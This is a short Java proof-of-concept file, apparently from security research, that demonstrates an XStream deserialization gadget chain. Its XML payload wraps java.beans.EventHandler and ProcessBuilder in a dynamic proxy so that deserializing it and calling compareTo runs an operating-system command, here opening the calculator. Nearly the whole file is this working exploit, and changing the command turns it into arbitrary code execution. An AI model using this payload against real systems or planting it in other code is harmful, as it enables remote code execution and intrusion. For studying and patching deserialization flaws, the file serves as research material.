package com.trganda.xstream.sortedmap;

import com.thoughtworks.xstream.XStream;
import com.trganda.xstream.Square;

public class XStreamSortedMap {
    public static void main(String[] args) {
        String from = "<dynamic-proxy>\n" +
            "<interface>java.lang.Comparable</interface>\n" +
            "<handler class=\"java.beans.EventHandler\">\n" +
            "    <target class=\"java.lang.ProcessBuilder\">\n" +
            "        <command>\n" +
            "             <string>open</string>\n" +
            "             <string>-a</string>\n" +
            "             <string>calculator</string>\n" +
            "        </command>\n" +
            "    </target>\n" +
            "    <action>start</action>\n" +
            "</handler>\n" +
            "</dynamic-proxy>";
        Comparable resultXML = (Comparable) new XStream().fromXML(from);
        System.out.println(resultXML);
        resultXML.compareTo("");
    }
}
